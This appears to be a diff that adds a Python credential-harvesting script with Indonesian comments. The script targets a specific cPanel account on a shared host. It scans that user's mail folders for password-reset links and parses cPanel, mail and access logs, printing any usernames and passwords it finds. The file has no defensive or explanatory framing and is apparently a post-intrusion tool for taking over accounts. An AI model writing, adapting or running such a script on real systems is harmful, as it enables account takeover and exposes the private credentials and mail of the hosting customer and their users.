@@ -1,0 +1,76 @@
+import os
+import re
+import requests
+
+def scan_mail_for_reset(mail_path):
+    """Scan direktori mail untuk cari link reset password"""
+    reset_links = []
+    
+    for root, dirs, files in os.walk(mail_path):
+        for file in files:
+            if file.endswith((".eml", ".msg")) or file in ["new", "cur"]:
+                filepath = os.path.join(root, file)
+                try:
+                    with open(filepath, "r", errors="ignore") as f:
+                        content = f.read()
+                        # CARI LINK RESET CPANEL
+                        pattern = r'https?://[^\s"\'<>]+/(reset|changepw|recover|password)[^\s"\'<>]*'
+                        matches = re.findall(pattern, content, re.IGNORECASE)
+                        if matches:
+                            reset_links.extend(matches)
+                            print(f"[+] Found reset link in: {filepath}")
+                except:
+                    continue
+    
+    return reset_links
+
+def extract_login_creds(log_path):
+    """Ekstrak user/password dari log"""
+    creds = []
+    
+    with open(log_path, "r", errors="ignore") as f:
+        lines = f.readlines()
+        for line in lines:
+            # CARI PATTERN PASSWORD DI LOG
+            if "password" in line.lower() or "pwd" in line.lower():
+                # EKSTRAK USER & PASS
+                user_match = re.search(r'user[=:]\s*([^\s]+)', line, re.IGNORECASE)
+                pass_match = re.search(r'pass[=:]\s*([^\s]+)', line, re.IGNORECASE)
+                if user_match and pass_match:
+                    creds.append((user_match.group(1), pass_match.group(1)))
+    
+    return creds
+
+# ========== MAIN ==========
+mail_dir = "/home/stppmeda/mail/"
+
+print("[+] Scanning mail directory for reset links...")
+reset_links = scan_mail_for_reset(mail_dir)
+
+if reset_links:
+    print(f"[+] Found {len(reset_links)} reset links:")
+    for link in reset_links:
+        print(f"  - {link}")
+else:
+    print("[-] No reset links found.")
+
+# SCAN LOG
+log_paths = [
+    "/usr/local/cpanel/logs/access_log",
+    "/usr/local/cpanel/logs/login_log",
+    "/var/log/maillog",
+    "/home/stppmeda/logs/access_log",
+]
+
+print("\n[+] Scanning logs for credentials...")
+for log_path in log_paths:
+    if os.path.exists(log_path):
+        creds = extract_login_creds(log_path)
+        if creds:
+            print(f"[+] Found credentials in {log_path}:")
+            for user, pwd in creds:
+                print(f"    User: {user} | Pass: {pwd}")
+        else:
+            print(f"[-] No credentials found in {log_path}")
+    else:
+        print(f"[-] Log not found: {log_path}")
